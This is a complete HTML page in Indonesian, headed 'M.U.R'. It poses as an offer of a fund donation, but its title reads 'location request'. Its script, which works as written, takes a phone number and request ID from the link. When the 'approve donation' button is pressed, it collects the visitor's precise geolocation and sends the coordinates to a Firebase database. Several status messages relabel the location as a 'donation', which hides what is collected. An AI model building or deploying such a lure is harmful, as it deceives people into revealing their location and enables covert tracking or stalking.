<!DOCTYPE html>
<html lang="id">

<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width,initial-scale=1">

<title>M.U.R - Permintaan Lokasi</title>

<style>

*{
  box-sizing:border-box;
}

body{

  margin:0;
  min-height:100vh;
  background:teal;
  color:#fff;
  font-family:Arial,sans-serif;

  display:flex;
  align-items:center;
  justify-content:center;

  padding:20px;
}

.box{

  width:100%;
  max-width:430px;

  background:#151515;

  padding:25px;

  border-radius:20px;

  text-align:center;

  box-shadow:
  0 0 25px rgba(255,0,0,.2);
}

.logo{

  color:darkgray;

  font-size:32px;

  font-weight:bold;
}

.info{

  background:#241313;

  border:1px solid #662222;

  padding:15px;

  border-radius:12px;

  line-height:1.6;

  margin:20px 0;
}

button{

  width:100%;

  padding:15px;

  margin-top:12px;

  border:0;

  border-radius:10px;

  font-size:16px;

  font-weight:bold;
}

.allow{

  background:lightblue;

  color:teal;
}

.deny{

  background:maroon;

  color:white;
}

button:disabled{

  opacity:.5;
}

#status{

  margin-top:20px;

  color:#aaa;

  line-height:1.5;

  word-break:break-word;
}

</style>

</head>

<body>

<div class="box">

<div class="logo">M.U.R</div>

<h2>Penawaran Berbagi dana</h2>

<p>
Seseorang menawarkan Anda donasi dana.
</p>

<div class="info">

<b>Privasi Anda</b>

<br><br>

dana hanya akan dibagikan
setelah Anda menekan
<b>SETUJUI</b>.

<br><br>

Anda bebas memilih
<b>TOLAK</b> jika tidak ingin
menerima donasi.

</div>

<button
class="allow"
id="allowButton"
onclick="setujui()">

SETUJUI donasi

</button>

<button
class="deny"
id="denyButton"
onclick="tolak()">

TOLAK

</button>

<div id="status"></div>

</div>

<script>

/* =========================
   PARAMETER LINK
========================= */

const params =
  new URLSearchParams(
    window.location.search
  );

const requestId =
  params.get("request");

const nomor =
  params.get("nomor");


/* =========================
   FIREBASE
========================= */

const FIREBASE_URL =
"https://mur-studio-default-rtdb.asia-southeast1.firebasedatabase.app/";


const statusBox =
  document.getElementById("status");


/* =========================
   VALIDASI
========================= */

function validasi(){

  if(!requestId || !nomor){

    statusBox.textContent =
      "Link permintaan tidak valid.";

    return false;
  }

  return true;
}


/* =========================
   UPDATE FIREBASE
========================= */

async function updateFirebase(data){

  const url =
    FIREBASE_URL +
    "permintaan/" +
    encodeURIComponent(nomor) +
    "/" +
    encodeURIComponent(requestId) +
    ".json";


  const response =
    await fetch(
      url,
      {
        method:"PATCH",

        headers:{
          "Content-Type":
          "application/json"
        },

        body:
          JSON.stringify(data)
      }
    );


  if(!response.ok){

    const errorText =
      await response.text();

    throw new Error(
      "Firebase HTTP " +
      response.status +
      " " +
      errorText
    );
  }

}


/* =========================
   SETUJUI
========================= */

function setujui(){

  if(!validasi()){
    return;
  }


  if(!navigator.geolocation){

    statusBox.textContent =
      "Perangkat tidak mendukung .";

    return;
  }


  document.getElementById(
    "allowButton"
  ).disabled = true;


  document.getElementById(
    "denyButton"
  ).disabled = true;


  statusBox.textContent =
    "Meminta izin lokasi...";


  navigator.geolocation.getCurrentPosition(

    async function(position){

      try{

        const latitude =
          position.coords.latitude;

        const longitude =
          position.coords.longitude;


        statusBox.textContent =
          "perangkat didapat. Mengirim...";


        await updateFirebase({

          status:"disetujui",

          latitude:latitude,

          longitude:longitude,

          respondedAt:Date.now(),

          waktu:
            new Date().toISOString()

        });


        statusBox.textContent =
          "✓ donasi berhasil dibagikan.";


      }catch(error){

        document.getElementById(
          "allowButton"
        ).disabled = false;

        document.getElementById(
          "denyButton"
        ).disabled = false;


        statusBox.textContent =
          "Gagal mengirim lokasi: " +
          error.message;
      }

    },

    function(error){

      document.getElementById(
        "allowButton"
      ).disabled = false;

      document.getElementById(
        "denyButton"
      ).disabled = false;


      if(error.code === 1){

        statusBox.textContent =
          "Izin lokasi ditolak. " +
          "Izinkan lokasi lalu coba lagi.";

      }else if(error.code === 2){

        statusBox.textContent =
          "Lokasi tidak tersedia.";

      }else if(error.code === 3){

        statusBox.textContent =
          "Waktu mendapatkan donasi habis. " +
          "Coba lagi.";

      }else{

        statusBox.textContent =
          "Gagal mendapatkan donasi.";
      }

    },

    {

      enableHighAccuracy:true,

      timeout:20000,

      maximumAge:0

    }

  );

}


/* =========================
   TOLAK
========================= */

async function tolak(){

  if(!validasi()){
    return;
  }


  document.getElementById(
    "allowButton"
  ).disabled = true;


  document.getElementById(
    "denyButton"
  ).disabled = true;


  statusBox.textContent =
    "Mengirim penolakan...";


  try{

    await updateFirebase({

      status:"ditolak",

      respondedAt:Date.now()

    });


    statusBox.textContent =
      "Permintaan ditolak.";


  }catch(error){

    document.getElementById(
      "allowButton"
    ).disabled = false;

    document.getElementById(
      "denyButton"
    ).disabled = false;


    statusBox.textContent =
      "Gagal mengirim jawaban: " +
      error.message;
  }

}

</script>

</body>
</html>
